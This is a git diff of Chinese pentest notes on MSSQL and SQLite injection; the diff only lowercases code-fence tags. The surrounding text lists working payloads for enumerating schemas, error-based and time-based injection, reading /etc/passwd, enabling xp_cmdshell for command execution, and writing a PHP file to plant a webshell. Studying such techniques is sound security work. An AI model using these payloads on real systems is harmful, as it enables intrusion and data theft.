@@ -62,7 +62,7 @@ $row =mssql_query($query);
 
 mssql 总体与 mysql差不多，但很多细节不同，没有`show`,`limit`,`group_concat`
 
-```SQL
+```sql
 select user
 select @@version
 select db_name()
@@ -70,26 +70,26 @@ select db_name()
 
 查看权限
 
-```SQL
+```sql
 select IS_SRVROLEMEMBER('sysadmin')=1-- //sa
 select IS_MEMBER('db_owner')=1-- // dbo
 select IS_MEMBER('public')=1-- //public
 ```
 
 查询所有数据库 ：
-```SQL
+```sql
 select name from master.dbo.sysdatabases;
 ```
 
 查询用户表 ：
-```SQL
+```sql
 select  name from sysobjects where xtype='u'
 ```
 
 由于缺少关键字没法把查询结果合并成一列，因此都采逐个查询方式
 
 查询所有数据库
-```SQL
+```sql
 select top 1 name from master..sysdatabases where name not in (select top N name from master..sysdatabases order by name) order by name
 ```
 
@@ -99,12 +99,12 @@ select top 1 name from master..sysdatabases where name not in (select top N name
 
 查询所有表
 
-```SQL
+```sql
 select top 1  name from db..sysobjects where  xtype=char(85) and name not in (select top N name from db..sysobjects where xtype=char(85) )
 ```
 
 查询字段
-```SQL
+```sql
 select top 1  COLUMN_NAME  from  test.information_schema.columns where TABLE_NAME='users' and COLUMN_NAME not in (select top N  COLUMN_NAME  from  test.information_schema.columns where TABLE_NAME='users')
 ```
 
@@ -116,7 +116,7 @@ select top 1  COLUMN_NAME  from  test.information_schema.columns where TABLE_NAM
 ### ② 读文件
 
 读文件 与其他稍微有所不同，需要较高权限
-```SQL
+```sql
 1> create table readfile( context ntext)
 2> BULK INSERT readfile FROM '/etc/passwd' WITH ( DATAFILETYPE = 'char', KEEPNULLS)
 ```
@@ -128,16 +128,16 @@ select top 1  COLUMN_NAME  from  test.information_schema.columns where TABLE_NAM
 产生强制类型转化就行
 
 暴库
-```SQL
+```sql
 and db_name()>0;--
 ```
 
 爆表
-```SQL
+```sql
 and 1=(select top 1 name from sysobjects where xtype='u' ) --
 ```
 爆列
-```SQL
+```sql
  group by test.name having 1=1--
 ```
 ![UoXlgU.png](https://s1.ax1x.com/2020/07/21/UoXlgU.png)
@@ -145,12 +145,12 @@ and 1=(select top 1 name from sysobjects where xtype='u' ) --
 ### ④ declare 语句
 
 
-```SQL
+```sql
 declare @a nvarchar(200) set @a= 'select 1' exec(@a)
 ```
 
 
-```SQL
+```sql
 declare @a nvarchar(200) set @a=char(115)+char(101)+char(108)+char(101)+char(99)+char(116)+char(32)+char(49) exec(@a)
 ```
 
@@ -159,14 +159,14 @@ declare @a nvarchar(200) set @a=char(115)+char(101)+char(108)+char(101)+char(99)
 
 ### ⑤ 延时注入
 
-```SQL
+```sql
 select 1; waitfor delay '0:0:5';
 ```
 ### ⑥  命令执行
 win 下
 开启xp_cmdshell
 
-```SQL
+```sql
 EXEC sp_configure 'show advanced options', 1;
 RECONFIGURE;
 EXEC sp_configure'xp_cmdshell', 1;
@@ -176,7 +176,7 @@ RECONFIGURE;
 
 关闭
 
-```SQL
+```sql
 EXEC sp_configure 'show advanced options', 1;
 RECONFIGURE;
 EXEC sp_configure'xp_cmdshell', 0;
@@ -184,7 +184,7 @@ RECONFIGURE;
 ```
 
 执行命令格式：
-```SQL
+```sql
 xp_cmdsehll('whoami');
 ```
 
@@ -237,18 +237,18 @@ sqlite与其他数据库存储结构有所差异，以文件形式存在
 
 ## (1) 基础语句
 
-```SQL
+```sql
 select sqlite_version();
 ```
 
 查询所有表，不包含隐藏表`sqlite_maste`,存在`limit` 语法
 
-```SQL
+```sql
 SELECT group_concat(name) FROM sqlite_master WHERE type='table'
 ```
 
 所有表结构(包含字段名，表名)
-```SQL
+```sql
 SELECT sql FROM sqlite_master WHERE type='table'
 ```
 
@@ -257,13 +257,13 @@ SELECT sql FROM sqlite_master WHERE type='table'
 ### ① 盲注
 
 除去`and` ，`or` 还可用 `&` `|` , `||`在sqlite 里充当连接符 `&&`不可用
-```SQL
+```sql
 select * from test where id =1 and substr(sqlite_version(),1,1)='3'  
 ```
 
 ### ② 延时注入
 
-```SQL
+```sql
 select case when 1 then randomblob(100000000) else 0 end;
 ```
 无if,注意调节数值大小
@@ -273,7 +273,7 @@ select case when 1 then randomblob(100000000) else 0 end;
 ### ③ 写文件
 
 前提可以堆叠注入，具有写权限
-```SQL
+```sql
 sqlite> attach database 'shell.php' as 'shell';
 sqlite> create table shell.text(text varchar(300));
 sqlite> insert into shell.text(text) values('<?php phpinfo();?>');
